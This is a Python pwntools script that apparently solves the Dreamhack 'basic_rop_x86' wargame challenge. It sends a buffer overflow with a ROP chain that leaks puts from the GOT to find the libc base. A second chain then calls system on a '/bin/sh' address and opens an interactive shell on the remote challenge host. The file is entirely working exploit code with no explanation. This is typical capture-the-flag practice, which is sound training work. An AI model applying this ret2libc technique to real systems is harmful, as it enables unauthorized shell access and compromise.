from pwn import *
from pwnlib.config import initialize

if __name__ == "__main__":
    #io = process('./basic_rop_x86')
    io = remote('host1.dreamhack.games',14536)
    exe = ELF('./basic_rop_x86')
    libc = ELF('libc.so.6')
    system_offset = libc.symbols['system']
    puts_offset = libc.symbols['puts']
    puts = 0x08048420
    putsGot = 0x804a018
    ropchain = [
        'A'*0x48,
        puts,
        exe.sym.main,
        putsGot
    ]
    pause()
    io.sendline(flat(ropchain, arch='i386'))
    io.recvn(0x40)
    libc_leak=u32(io.recvn(4))-puts_offset
    ropchain = [
        'A'*0x48,
        libc_leak+system_offset,
        exe.sym.initialize,
        libc_leak+0x15902b
    ]
    io.sendline(flat(ropchain, arch='i386'))
    io.interactive()
